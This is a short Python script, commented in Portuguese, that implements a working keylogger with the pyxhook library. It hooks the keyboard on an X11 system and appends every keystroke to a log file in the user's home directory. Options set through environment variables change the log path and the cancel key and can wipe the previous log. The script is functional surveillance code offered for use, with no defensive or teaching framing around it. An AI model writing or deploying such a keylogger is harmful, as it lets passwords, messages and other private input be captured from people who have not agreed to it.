#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os 
import pyxhook 
  
# Informa ao keylogger onde salvar o arquivo de log
# você pode definir o caminho do arquivo com uma variável de  
# ambiente ou usar minha definição padrão ~/keyArq.log  
log_file = os.environ.get( 
    'pylogger_file', 
    os.path.expanduser('~/keyArq.log') 
) 
# Permitir definir a chave de cancelamento a partir de argumentos do ambiente, Padrão: ` 
cancel_key = ord( 
    os.environ.get( 
        'pylogger_cancel', 
        '`'
    )[0] 
) 
  
# Permitir a limpeza do arquivo de log no início, se pylogger_clean estiver definido. 
if os.environ.get('pylogger_clean', None) is not None: 
    try: 
        os.remove(log_file) 
    except EnvironmentError: 
       # Caso o arquivo não exista ou não tenha permissão. 
        pass
  
# capturar teclado e salvar no arquivo 
def OnKeyPress(event): 
    with open(log_file, 'a') as f: 
        f.write('{}\n'.format(event.Key)) 
  
# criar objeto
new_hook = pyxhook.HookManager() 
new_hook.KeyDown = OnKeyPress 
# setar o hook
new_hook.HookKeyboard() 
try: 
    new_hook.start()         # iniciar o hook 
except KeyboardInterrupt: 
    # cancelar comando. 
    pass
except Exception as ex: 
    # salva as exeções no arquivo para poder analisar. 
    msg = 'Error while catching events:\n  {}'.format(ex) 
    pyxhook.print_err(msg) 
    with open(log_file, 'a') as f: 
        f.write('\n{}'.format(msg)) 